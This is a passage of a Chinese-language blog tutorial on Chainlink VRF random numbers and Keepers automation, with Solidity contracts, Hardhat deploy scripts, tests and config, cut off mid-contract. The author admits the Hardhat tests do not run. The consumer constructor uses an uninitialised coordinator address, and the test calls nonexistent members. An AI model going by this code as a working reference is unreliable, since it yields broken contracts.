numWords);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override&#123;</span><br><span class="line">        // 10.接收随机数</span><br><span class="line">        s_randomWords = randomWords;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hardhat-1"><a href="#hardhat-1" class="headerlink" title="hardhat"></a>hardhat</h4><p>mock合约地址：<a href="https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/mocks/VRFCoordinatorV2Mock.sol">https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/mocks/VRFCoordinatorV2Mock.sol</a></p><ol><li><p>npm install —save-dev hardhat</p></li><li><p>npx hardhat init选择空的</p></li><li><p>依赖</p><ul><li>npm install —save-dev @chainlink/contracts</li><li>npm install —save-dev hardhat-deploy</li><li>npm install —save ethers@5.7</li><li>npm install —save-dev chai</li><li>npm install —save-dev ethereum-waffle：给chai加了一些方法</li><li>yarn add  @nomiclabs/hardhat-waffle -D</li><li>npm install —save @nomiclabs/hardhat-ethers@npm:hardhat-deploy-ethers：原因</li></ul><blockquote><p><a href="https://github.com/wighawag/hardhat-deploy">https://github.com/wighawag/hardhat-deploy</a></p><p>if you use <code>ethers.js</code> we recommend you also install <code>hardhat-deploy-ethers</code> which add extra features to access deployments as ethers contract.</p><p>Since <code>hardhat-deploy-ethers</code> is a fork of <code>@nomiclabs/hardhat-ethers</code> and that other plugin might have a hardcoded dependency on <code>@nomiclabs/hardhat-ethers</code> the best way to install <code>hardhat-deploy-ethers</code> and ensure compatibility is the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev  @nomiclabs/hardhat-ethers@npm:hardhat-deploy-ethers ethers</span><br></pre></td></tr></table></figure></blockquote></li></ol><p>注意，下面的代码存在包版本错误的问题，并没有跑起来(deploy可以跑，test跑不了)，主要理解思路</p><ul><li>VRFConsume.sol</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ChainlinkVRFDemo is VRFConsumerBaseV2&#123;</span><br><span class="line"></span><br><span class="line">    // 1.获取Coordinator的接口</span><br><span class="line">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class="line">    // 使用本地网络Mock</span><br><span class="line">    address vrfCoordinatorAddr;</span><br><span class="line">    // 2.获取keyHash，服务质量</span><br><span class="line">    bytes32 keyHash = 0x79d3d8832d904592c0bf9818b621522c988bb8b0c05cdc3b15aea1b6e8db0c15;</span><br><span class="line">    // 3.订阅ID号</span><br><span class="line">    uint64 s_subId;</span><br><span class="line">    // 4.我们认为3个区块之后获取VRF,实验方便起见，选3</span><br><span class="line">    uint16 requestConfirmations = 3; </span><br><span class="line">    // 5.gas回调设置，太小会导致无法写入随机数</span><br><span class="line">    uint32 callbackGasLimit = 5_200_00; // 太高或太小都会fail</span><br><span class="line">    // 6.我们请求4个随机数</span><br><span class="line">    uint32 numWords = 4; </span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    // 7.第几轮的随机数</span><br><span class="line">    uint256 public s_requestId;</span><br><span class="line">    // 8.随机数结果</span><br><span class="line">    uint256[] public s_randomWords;</span><br><span class="line"></span><br><span class="line">    constructor(address _vrfCoordinatorAddr, uint64 subId) VRFConsumerBaseV2(vrfCoordinatorAddr)&#123;</span><br><span class="line">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinatorAddr);</span><br><span class="line">        s_subId = subId;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        vrfCoordinatorAddr = _vrfCoordinatorAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestRandomWords() public &#123;</span><br><span class="line">        // 我们给Coordinator发送请求，Coordinator又调用预言机节点返回随机数，预言机节点需要花费gas</span><br><span class="line">        // 因此gas不仅仅是调用者花费gas，预言机节点也会花费gas，因此做一点限制</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        // bytes32 keyHash, 其实就是公钥信息。不同的keyHash代表我支付不同的gas费用，比如我想要更好更快的，则选择质量更高的keyHash，服务商会提供你更好的服务</span><br><span class="line">        // uint64 subId, 订阅ID号</span><br><span class="line">        // uint16 requestConfirmations, 认为多少个区块之后能成功获取VRF，L1一般是12</span><br><span class="line">        // uint32 callbackGasLimit, VRF调用我们的fulfillrandomWords()时使用的gas上限</span><br><span class="line">        // uint32 numWords 请求多少个随机数，目前上限是500</span><br><span class="line">        // 返回一个requestID,告诉你是哪次请求的</span><br><span class="line">        // 9.请求随机数</span><br><span class="line">        s_requestId = COORDINATOR.requestRandomWords(keyHash, s_subId, requestConfirmations, callbackGasLimit, numWords);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override&#123;</span><br><span class="line">        // 10.接收随机数</span><br><span class="line">        s_randomWords = randomWords;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>VRFCoordinatorMock.sol</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.19;</span><br><span class="line"></span><br><span class="line">import &quot;@chainlink/contracts/src/v0.8/mocks/VRFCoordinatorV2Mock.sol&quot;;</span><br></pre></td></tr></table></figure><ul><li>0_deploy_mock.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 起名原因：deploy是根据名字顺序进行部署，0代表第一个部署</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;getNamedAccounts, deployments&#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"><span class="comment">// getNamedAccounts: 获取谁来部署的，私钥等信息</span></span><br><span class="line"><span class="comment">// deployments: 部署的时候需要的一些函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> baseFee = <span class="string">&quot;10000000000000000&quot;</span>; <span class="comment">// 0.1 link</span></span><br><span class="line"><span class="keyword">const</span> gasPriceLink = <span class="string">&quot;1000000000&quot;</span>; <span class="comment">// 1 gwei </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将hardhat的deploy这个插件所需要的一些函数、对象等进行exports，这样的话我们就可以识别我们已经输出的函数，对合约进行部署</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">async</span> (&#123;getNamedAccounts, deployments&#125;) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;deploy&#125; = deployments</span><br><span class="line">    <span class="comment">// 选择一个私钥来部署,在配置文件中设置</span></span><br><span class="line">    <span class="keyword">const</span> &#123;deployer&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&quot;VRFCoordinatorV2Mock&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">from</span>: deployer,</span><br><span class="line">        <span class="comment">// 合约构造函数的参数</span></span><br><span class="line">        <span class="comment">// _baseFee: 运营商收取用户的基础费用</span></span><br><span class="line">        <span class="comment">// _gasPriceLink：用户愿意支付的gasPrice</span></span><br><span class="line">        <span class="attr">args</span>: [baseFee, gasPriceLink],</span><br><span class="line">        <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">tags</span> = [<span class="string">&quot;mock&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>1_deploy_vrf_consumer.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 起名原因：deploy是根据名字顺序进行部署，1代表第二个部署</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;getNamedAccounts, deployments&#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"><span class="comment">// getNamedAccounts: 获取谁来部署的，私钥等信息</span></span><br><span class="line"><span class="comment">// deployments: 部署的时候需要的一些函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将hardhat的deploy这个插件所需要的一些函数、对象等进行exports，这样的话我们就可以识别我们已经输出的函数，对合约进行部署</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">async</span> (&#123;getNamedAccounts, deployments&#125;) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;deploy&#125; = deployments</span><br><span class="line">    <span class="comment">// 选择一个私钥来部署,在配置文件中设置</span></span><br><span class="line">    <span class="keyword">const</span> &#123;deployer&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> vrfCoordinatorAddr</span><br><span class="line">    <span class="keyword">let</span> subId</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 得到Coordinator地址</span></span><br><span class="line">    <span class="keyword">let</span> vrfCoordinator = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&quot;VRFCoordinatorV2Mock&quot;</span>)</span><br><span class="line">    vrfCoordinatorAddr = vrfCoordinator.<span class="property">target</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得 subId</span></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">await</span> vrfCoordinator.<span class="title function_">createSubscription</span>()</span><br><span class="line">    <span class="keyword">const</span> txReceipt = <span class="keyword">await</span> tx.<span class="title function_">wait</span>(<span class="number">1</span>)</span><br><span class="line">    subId = txReceipt.<span class="property">logs</span>[<span class="number">0</span>].<span class="property">topics</span>[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 充值 link</span></span><br><span class="line">    <span class="keyword">await</span> vrfCoordinator.<span class="title function_">fundSubscription</span>(subId,<span class="string">&quot;10000000000000000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部署</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&quot;ChainlinkVRFDemo&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">from</span>: deployer,</span><br><span class="line">        <span class="comment">// 合约构造函数的参数</span></span><br><span class="line">        <span class="comment">// _baseFee: 运营商收取用户的基础费用</span></span><br><span class="line">        <span class="comment">// _gasPriceLink：用户愿意支付的gasPrice</span></span><br><span class="line">        <span class="attr">args</span>: [vrfCoordinatorAddr, subId],</span><br><span class="line">        <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">tags</span> = [<span class="string">&quot;vrf&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>test_vrf_consumer.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect,assert &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; deployments, ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;test VRFConsumer&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 让前两个合约进行部署</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> vrfCoordinator</span><br><span class="line">    <span class="keyword">let</span> vrfConsumer</span><br><span class="line"></span><br><span class="line">    <span class="title function_">beforeEach</span>(<span class="title function_">async</span>() =&gt;&#123;</span><br><span class="line">        <span class="comment">// 找到我们部署的合约，找到之后复制下来，相当于一个副本</span></span><br><span class="line">        <span class="keyword">await</span> deployments.<span class="title function_">fixture</span>([<span class="string">&quot;mock&quot;</span>,<span class="string">&quot;vrf&quot;</span>])</span><br><span class="line">        vrfCoordinator = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&quot;VRFCoordinatorV2Mock&quot;</span>)</span><br><span class="line">        vrfConsumer = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&quot;ChainlinkVRFDemo&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;check if we can request random number&quot;</span>, <span class="title function_">async</span>() =&gt;&#123;</span><br><span class="line">        <span class="title function_">expect</span>(vrfConsumer.<span class="title function_">requestRandomWords</span>()).<span class="property">to</span>.<span class="title function_">emit</span>(</span><br><span class="line">            vrfCoordinator, <span class="comment">// 哪个合约发出的</span></span><br><span class="line">            <span class="string">&quot;RandomWordsRequested&quot;</span> <span class="comment">// 发出哪个事件</span></span><br><span class="line">        )</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;check if we can receive random number&quot;</span>, <span class="title function_">async</span>() =&gt;&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;test1&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> vrfConsumer.<span class="title function_">requestRandomWords</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;test2&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> requestId = vrfConsumer.<span class="title function_">requestId</span>()</span><br><span class="line">        <span class="keyword">let</span> vrfConsumerAddr = vrfConsumer.<span class="property">target</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 我们需要自己触发回调函数写随机数</span></span><br><span class="line">        <span class="keyword">await</span> vrfCoordinator.<span class="title function_">fulfillRandomWords</span>(requestId,vrfConsumerAddr)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> randomWords0 = <span class="keyword">await</span> vrfConsumer.<span class="title function_">s_randomWords</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">const</span> randomWords1 = <span class="keyword">await</span> vrfConsumer.<span class="title function_">s_randomWords</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">const</span> randomWords2 = <span class="keyword">await</span> vrfConsumer.<span class="title function_">s_randomWords</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">assert</span>(randomWords0.<span class="title function_">gt</span>(ethers.<span class="property">constant</span>.<span class="property">Zero</span>),<span class="string">&quot;first random wrong&quot;</span>)</span><br><span class="line">        <span class="title function_">assert</span>(randomWords1.<span class="title function_">gt</span>(ethers.<span class="property">constant</span>.<span class="property">Zero</span>),<span class="string">&quot;second random wrong&quot;</span>)</span><br><span class="line">        <span class="title function_">assert</span>(randomWords2.<span class="title function_">gt</span>(ethers.<span class="property">constant</span>.<span class="property">Zero</span>),<span class="string">&quot;third random wrong&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>hardhat .config.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@type</span> import(&#x27;hardhat/config&#x27;).HardhatUserConfig */</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomiclabs/hardhat-ethers&quot;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;hardhat-deploy&quot;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;@nomiclabs/hardhat-waffle&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: <span class="string">&quot;0.8.19&quot;</span>,</span><br><span class="line">  <span class="attr">namedAccounts</span>: &#123;</span><br><span class="line">    <span class="attr">deployer</span>: &#123;</span><br><span class="line">      <span class="attr">default</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>package.json</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vrfdemo&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@chainlink/contracts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.6.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@nomicfoundation/hardhat-chai-matchers&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@nomicfoundation/hardhat-ethers&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@nomiclabs/hardhat-waffle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;chai&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.7&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ethereum-waffle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.10&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hardhat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.17.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hardhat-deploy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.11.34&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@nomiclabs/hardhat-ethers&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm:hardhat-deploy-ethers&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ethers&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.7.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Keepers"><a href="#Keepers" class="headerlink" title="Keepers"></a>Keepers</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>合约自动化执行</p><p>如果是如下的两种方式，存在一定的问题</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808213240543.png" alt="image-20230808213240543"></p><p>chainlink的方案</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808213527191.png" alt="image-20230808213527191"></p><p>流程</p><ol><li>Oracle检查CheckUpkeep，判断是否满足条件</li><li>如果CheckUpkeep条件不满足，则下个区块继续检查</li><li>如果CheckUpkeep条件满足，oracle 则调用keepers注册合约</li><li>Keepers注册合约调用用户合约performUpkeep</li></ol><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808213556773.png" alt="image-20230808213556773"></p><ul><li>技术架构</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808213933885.png" alt="image-20230808213933885"></p><ul><li>使用场景</li></ul><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230808214100891.png" alt="image-20230808214100891"></p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><h4 id="remix-2"><a href="#remix-2" class="headerlink" title="remix"></a>remix</h4><p>网站：<a href="https://automation.chain.link/goerli/new">https://automation.chain.link/goerli/new</a></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230809122501013.png" alt="image-20230809122501013"></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230809122532171.png" alt="image-20230809122532171"></p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230809122727589.png" alt="image-20230809122727589"></p><p>完成注册</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230809122853065.png" alt="image-20230809122853065"></p><p>成功实验</p><p><img src="/2024/04/14/12.DeFi/06.Chainlink_oracle/image-20230809123204641.png" alt="image-20230809123204641"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// array [1000, 1000, 1000, ...]</span><br><span class="line">// function =&gt; array [1000, 900, 1000, 900, ...]</span><br><span class="line">// checkupkeep: update =&gt; performUpkeep</span><br><span class="line">// checkupkeep: not updated =&gt; next round check</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/automation/interfaces/KeeperCompatibleInterface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract KeepersDemo is KeeperCompatibleInterface&#123;</span><br><span class="line"></span><br><span class="line">    uint256 public constant SIZE = 10;</span><br><span class="line">    uint256 public constant INITIAL_BALANCE = 1000;</span><br><span class="line">    uint256[SIZE] public balances;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; SIZE; i++)&#123;</span><br><span class="line">            balances[i] = INITIAL_BALANCE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount,uint256[] memory indexs) public &#123;</span><br><span class="line">        for(uint256 i = 0; i &lt; indexs.length; i++)&#123;</span><br><span class="line">            balances[indexs[i]] -= amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// chainlink预言机在链下执行</span><br><span class="line">// 应该把绝大部分逻辑写在这里面</span><br><span class="line">// performUpkeep()里面的操作应该尽可能的少，以此来减少gas消耗</span><br><span class="line">// 可以通过bytes 信息告诉performUpkeep</span><br><span class="line">    function checkUpkeep(bytes calldata) external view override returns (bool upkeepNeeded, bytes memory 